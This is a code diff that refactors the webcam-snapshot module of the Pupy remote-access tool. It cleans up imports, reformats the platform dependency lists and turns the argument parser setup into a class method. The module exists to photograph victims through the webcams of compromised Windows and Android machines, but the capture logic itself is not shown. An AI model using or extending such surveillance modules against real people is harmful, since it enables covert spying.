@@ -15,14 +15,12 @@
 # THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
 # --------------------------------------------------------------
 
-from pupylib.PupyModule import *
+from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
+
 import os
 import os.path
-import textwrap
 import logging
 import datetime
-from zlib import compress, crc32
-import struct
 import subprocess
 
 __class_name__="WebcamSnapModule"
@@ -41,16 +39,17 @@ class WebcamSnapModule(PupyModule):
     """ take a webcam snap :) """
 
     dependencies = {
-        'android': [ 'pupydroid.camera' ],
-        'windows': [ 'vidcap' ]
+        'android': ['pupydroid.camera'],
+        'windows': ['vidcap']
     }
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog='webcam_snap', description=self.__doc__)
-        self.arg_parser.add_argument('-d', '--device', type=int, default=0, help='take a webcam snap on a specific device (default: %(default)s)')
-        self.arg_parser.add_argument('-n', '--nb-cameras', action='store_true', help='print number of cameras (Android Only)')
-        self.arg_parser.add_argument('-q', '--jpg-quality', type=int, default=40, help='define jpg quality (Android Only) (default: %(default)s)')
-        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open eog on the snap for preview')
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog='webcam_snap', description=cls.__doc__)
+        cls.arg_parser.add_argument('-d', '--device', type=int, default=0, help='take a webcam snap on a specific device (default: %(default)s)')
+        cls.arg_parser.add_argument('-n', '--nb-cameras', action='store_true', help='print number of cameras (Android Only)')
+        cls.arg_parser.add_argument('-q', '--jpg-quality', type=int, default=40, help='define jpg quality (Android Only) (default: %(default)s)')
+        cls.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open eog on the snap for preview')
 
     def run(self, args):
         try:
